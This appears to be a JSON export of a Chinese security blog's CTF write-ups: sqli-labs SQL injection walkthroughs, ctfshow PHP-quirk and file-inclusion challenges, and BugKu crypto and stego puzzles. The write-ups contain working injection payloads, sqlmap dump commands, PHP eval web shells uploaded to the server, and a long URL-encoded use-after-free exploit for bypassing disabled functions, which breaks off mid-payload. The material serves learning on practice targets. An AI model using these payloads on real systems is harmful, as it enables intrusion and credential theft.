web109找不到服务器……","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"刷题","slug":"ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"ctfshow/刷题/php特性","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"php特性","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"Hello World","slug":"hello-world","date":"2023-02-26T09:53:28.226Z","updated":"2025-04-19T13:25:36.799Z","comments":true,"path":"2023/02/26/hello-world/","permalink":"https://lvzhouhang.xyz/2023/02/26/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"sqli-labs","slug":"sqli-labs","date":"2023-02-20T12:24:45.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/02/20/sqli-labs/","permalink":"https://lvzhouhang.xyz/2023/02/20/sqli-labs/","excerpt":"less-1看报错可知，这是闭合单引号。 1234?id=1&#x27;order by 3 -- - #确定那个字段有回显?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- - #查询表名?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - #查询列名?id=-1&#x27;union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - #查询当前数据库user表里面的username和password。","text":"less-1看报错可知，这是闭合单引号。 1234?id=1&#x27;order by 3 -- - #确定那个字段有回显?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- - #查询表名?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - #查询列名?id=-1&#x27;union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - #查询当前数据库user表里面的username和password。 用sqlmap更简单 12345sqlmap -u &quot;ip?id=1&quot;sqlmap -u &quot;ip?id=1&quot; -dbs #列出所有数据库sqlmap -u &quot;ip?id=1&quot; -D security -tables #列出当前数据库里的表sqlmap -u &quot;ip?id=1&quot; -D security -T users -columns #列出表里的列sqlmap -u &quot;ip?id=1&quot; -D security -T users -C username,password --dump #获取表里的数据 less-2这一题就不用闭合，剩下的和第一题一样。 1234?id=1 order by 3 -- - ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - ?id=-1 union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - less-3看错误提示可知，需要用&#39;)来闭合，剩下的和第一题一样。 1234?id=1&#x27;) order by 3 -- - ?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - ?id=-1&#x27;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - less-4看错误提示，可知闭合方式是&quot;)，但是单引号不会报错,剩下的和第一题一样。 1234?id=1&quot;) order by 3 -- - ?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - ?id=-1&quot;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - less-5根据错误可以判断是单引号报错。联合注入也没有办法用，可以使用报错注入。extractvalue函数payload:id=’and(select extractvalue(“anything”,concat(‘~’,(select语句)))) 12345函数原型：extractvalue(xml_document,Xpath_string)正常语法：extractvalue(xml_document,Xpath_string);第一个参数：xml_document是string格式，为xml文档对象的名称第二个参数：Xpath_string是xpath格式的字符串作用：从目标xml中返回包含所查询值的字符串 payload： 1234567891011?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,(select database()))))-- - #获取当前数据库的名称?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31))))-- -#查询当前数据库里所有的表?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,31))))-- -#查询表里列的名称?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,31))))-- -#查询表里面的内容# extractvalue()函数能显示的最大长度为32，所以用substr()函数来分页，或者使用limit分页也可以。concat()里面的~也可以是其他的。 updatexml:payload:id=’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”)) 1234?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select database())),1)-- -?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=database() )),1)-- -?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; )),1)-- -?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,31))))-- - floor:payload:’union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from “一个足大的表” group by x)a less-6闭合方式为&quot;，报错注入仍可行。 less-7文件读写注入，但是我怎么运行文件都不写入，放弃了。 less-8布尔盲注。 12345?id=-1&#x27;and (ascii(substr(select database()),1,1))==115--+ #判断第一个数据库名字第一个字符的ascii码是否等于115?id=1&#x27; and (ascii(substr((select database()) ,2,1))) = 101 --+ #判断第一个数据库名字第二个字符的ascii码是否等于101?id=1&#x27;and (length(database())) = 8 --+ #判断数据库名字的长度是否等于8?id=1&#x27;and (length(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1)) = 5 --+ #判断地三张表名字的长度是否为5?id=1&#x27; and (length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))) = 8 --+ #判断users表里地二个列名的长度是否为8 如果判断正确的话，页面返回正常。好麻烦啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊。 less-9时间盲注 1id=1&#x27; and if(length(database())&gt;3 ,sleep(5),1) -- - #如果数据库长度长于3的话，延迟5秒返回页面。 MySQL时间盲注五种延时方法 less-10还是时间盲注，闭合方式为&quot;。 less-11这个就在username上直接输入sql语句就行。也可以用hackbar，Post传参。其他语句不变。.","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://lvzhouhang.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"ctfshow web入门101~104","slug":"ctfshow-web入门101~104","date":"2023-02-18T11:30:48.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/02/18/ctfshow-web入门101~104/","permalink":"https://lvzhouhang.xyz/2023/02/18/ctfshow-web%E5%85%A5%E9%97%A8101~104/","excerpt":"","text":"web101 12当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示即使传入了空的括号，代码依旧可以运行，且error_reporting(0)的存在阻止了报错 v1必须是数字，v2可以使用可以使用反射类new ReflectionClass(),v3没有过滤;。payload: 1v1=1&amp;v2=echo new Reflectionclass&amp;v3=; 0x2d还是-，然后最后一位需要自己猜。 web102 12345is_numeric() 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true，否则返回false。如果字符串中含有一个e代表科学计数法，也可返回truecall_user_func() 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数file_put_contents() 函数应该都熟悉了，写入内容到文件中，第一个参数是文件名，第二个参数是内容 要确保v4为真，就要确保v2是数字.将v2进行base64编码然后再转换成16进制。payload： 12v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.phpPOST：v1=hex2bin 然后访问2.php查看源码就能找到flag。 web103找不到服务器，做不了题. web104因为没有判断，可以直接让两个值相等，也可以用数组绕过，也可以用两个相等的sha1的值。 1234aaK1STfY0e76658526655756207688271159624026011393aaO8zKZF0e89257456677279068558073954252716165668","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"刷题","slug":"ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"ctfshow/刷题/php特性","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"php特性","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow web97~100","slug":"ctfshow-web入门97~100","date":"2023-02-07T06:20:16.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/02/07/ctfshow-web入门97~100/","permalink":"https://lvzhouhang.xyz/2023/02/07/ctfshow-web%E5%85%A5%E9%97%A897~100/","excerpt":"web97要求POST传参，a不能等于b，但是a和b的md5值要相同，但是md5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL。 1a[]=123&amp;b[]=1234","text":"web97要求POST传参，a不能等于b，但是a和b的md5值要相同，但是md5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL。 1a[]=123&amp;b[]=1234 web98 1234分析上面的代码可以看出来，只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址），而第二三行代码没啥用，我们用不到，直接看第四行，如果get参数HTTP_FLAG的值为flag，就读取文件，也就是输出flag。所以思路就有了，我们通过get随便传一个参数并赋值，然后我们通过post请求传HTTP_FLAG参数并赋值为flag即可获得flag。 12GET:?1=1POST:HTTP_FLAG=flag web99 12345 array()，是空数组定义，题中定义了$allow为空数组0x36d，其十进制为877rand()，返回随机整数array_push()，是向数组尾部插入新的值file_put_contents()，写文件 因为in_array第三个参数没设置为true，所以该函数是宽松比较（==），字符串型会先转化为整型再比较，只要值相同就可以了，所以我们可以传参写木马进去. 12?n=1.phpcontent=&lt;?php @eval($_POST[1]);?&gt; 然后用蚁剑连接 web100is_numeric() 函数用于检测变量是否为数字或数字字符串,如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。v1一定要是个数字，v2不能有分号，v3必须有分号。 12get:/?v1=1&amp;v2=eval($_POST[1])?&gt; %23&amp;v3=;post:1=system(&quot;tac ctfshow.php&quot;); 1$flag_is_3110c36f0x2df28a0x2d4b840x2dbe0f0x2d2c4f600a4b95; 0x2d是-，换上后加上ctfshow{}就可以了","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"刷题","slug":"ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"ctfshow/刷题/php特性","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"php特性","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow web89~96","slug":"89","date":"2023-02-02T06:20:16.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/02/02/89/","permalink":"https://lvzhouhang.xyz/2023/02/02/89/","excerpt":"web89用数组绕过就行。payload: 1?num[]=a;","text":"web89用数组绕过就行。payload: 1?num[]=a; web90 1234567891011intval( mixed $var[, int $base = 10] ) : intvar要转换成 integer 的数量值base转化所使用的进制 Note: 如果 base 是 0，通过检测 var 的格式来决定使用的进制： ◦ 如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则， ◦ 如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则， ◦ 将使用 10 进制 (decimal)。 只需要提交0x117c就行，0x117c是16进制的4476，也可以提交4476+字符。payload: 12?num=0x117c?num=4476a web91第一次是/im第二次是/i/im可以匹配多行，/i只能匹配一行。所以让他第一次匹配到php第二次匹配不到php。payload: 1?cmd=1%0aphp web92可以换个进制绕过 1?num=0x117c 或者还有e这个东西 1intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以 1?num=4476e123 web93可以用小数，也可以用8进制payload: 12?num=4476.1?num=010574 123二进制0bxxx八进制0xxxxxx十六进制0xaaaa web94strpos是匹配字符，必须要匹配到0而且还不能在第一位，可以用8进制也可以用小数。如果用8进制的话必须在开头加一个空格。payload: 12?num=4476.0/?num= 010574 web95这一道题多过滤了一个点，所以没法用小数了，其他的跟上一道题一样。payload: 1?num= 010574 web96想办法读取flag.php还不能直接传flag.php，利用路径或者php协议就行。payload: 123?u=/var/www/html/flag.php?u=./flag.php?u=php://filter/resource=falg.php","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"刷题","slug":"ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"ctfshow/刷题/php特性","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"php特性","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow web入门87~88","slug":"ctfshow-web入门87","date":"2023-01-31T10:13:37.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/31/ctfshow-web入门87/","permalink":"https://lvzhouhang.xyz/2023/01/31/ctfshow-web%E5%85%A5%E9%97%A887/","excerpt":"web87谈一谈php://filter的妙用","text":"web87谈一谈php://filter的妙用 123将 php://filter/write=convert.base64-decode/resource=123.php （这里因为我们需要的是写入的权限，所以是write）进行两次url编码，得到如下%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%33%32%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30 然后再content写入经过base64编码过后的一句话 （PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==）这里content的值前面要加两个字符，因为base64算法解码时是4个byte一组，所以给他增加2个字符 一共8个字符然后再查看fl0g.php就行了 web88过滤的东西很多，但data协议还可以用。 1?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgKi5waHAiKTs/Pg base64后面是base64编码但是不能带有加号和等号，有加号的payload不能用。 web116和web117不会做…..","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"刷题","slug":"ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"文件包含","slug":"ctfshow/刷题/文件包含","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"文件包含","slug":"文件包含","permalink":"https://lvzhouhang.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"BugKu刷题","slug":"BugKu刷题","date":"2023-01-28T02:30:19.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/28/BugKu刷题/","permalink":"https://lvzhouhang.xyz/2023/01/28/BugKu%E5%88%B7%E9%A2%98/","excerpt":"聪明的小羊题目描述：一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}栅栏密码，分两栏时就是flag。","text":"聪明的小羊题目描述：一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}栅栏密码，分两栏时就是flag。 flag:flag&#123;6fde4163df05d900&#125; /.-题目描述： ..-./.-../.-/–./—-.–/-../…–/..-./-.-./-…/..-./.—-/–…/..-./—-./…–/—-./—-./…../—–/….-/—–.-很明显的摩斯密码，在线摩斯密码翻译，可以解出flag：FLAG%u7bD3FCBF17F9399504%u7d%u7b是{，%u7d是}，然后字母全部改为小写就是flag。flag:flag&#123;d3fcbf17f9399504&#125; ok题目是okk编码，用可以直接获得flag。flag：flag&#123;0a394df55312c51a&#125; linux下载文件解压，用记事本的形式打开文件，ctrl+搜索key就能找到flag。flag:key&#123;feb81d3834e2423c9903f4755464060b&#125; 闪的好快下载是一个gif图，用stegsolve打开，一帧一帧扫二维码，然后拼接起来就是flag。flag：SYC&#123;F1aSh_so_f4sT&#125; 隐写2图片的大小感觉和他本身有点不符，用binwalk一看，确实有隐藏的文件。分离之后是一个压缩包和一个提示，提示说明解压密码是三位数字。暴力破解一下，密码是871，解压之后又是一个图片，用记事本打开，末尾有f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE=&#125;base64解码得到falg。flag：f1@g&#123;y0u Are a h@cker!&#125; 白哥的鸽子用stegsolve打开，fileformat最下面有类似于flag的文字。栅栏密码在线加密解密栅栏加密，当栅栏数为3时，就是flag。flag：flag&#123;w22_is_v3ry_cool&#125; 再也没有纯白的灵魂文件开头是~呜嗷开头的，查过之后才发现是兽音密文。由于不知道怎么加密的，就先将flag加密一下试试，然后一一对应，最坑人的是少了一个G，真的恶心人。。。。最后解出来就是flag。flag：flag&#123;ni-zhen-shi-shou-ren&#125;","categories":[{"name":"BugKu","slug":"BugKu","permalink":"https://lvzhouhang.xyz/categories/BugKu/"},{"name":"刷题","slug":"BugKu/刷题","permalink":"https://lvzhouhang.xyz/categories/BugKu/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"BugKu","slug":"BugKu","permalink":"https://lvzhouhang.xyz/tags/BugKu/"}]},{"title":"ctfshow web入门69~74","slug":"ctfshow-web入门69~74","date":"2023-01-25T07:23:05.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/25/ctfshow-web入门69~74/","permalink":"https://lvzhouhang.xyz/2023/01/25/ctfshow-web%E5%85%A5%E9%97%A869~74/","excerpt":"web69和web68一样。payload: 1c=include(&quot;/flag.txt&quot;);","text":"web69和web68一样。payload: 1c=include(&quot;/flag.txt&quot;); web70同上。 web71 12$s = ob_get_contents();//得到缓冲区的数据。ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。可以用exit();停止后面的程序。 payload: 1c=include(&quot;/flag.txt&quot;);exit(); web72这道题过滤了数字和字母，不会一点不会。参考一下大佬的wp将 1234567c=?&gt;&lt;?php$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);?&gt; 进行url编码。 1c=?%3E%3C?php%0A$a=new%20DirectoryIterator(%22glob:///*%22);%0Aforeach($a%20as%20$f)%0A%7Becho($f-%3E__toString().&#x27;%20&#x27;);%0A%7D%0Aexit(0);%0A?%3E 看到了flag0.txt,但是直接include的话没有权限。要用什么uaf绕过payload: 1c=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20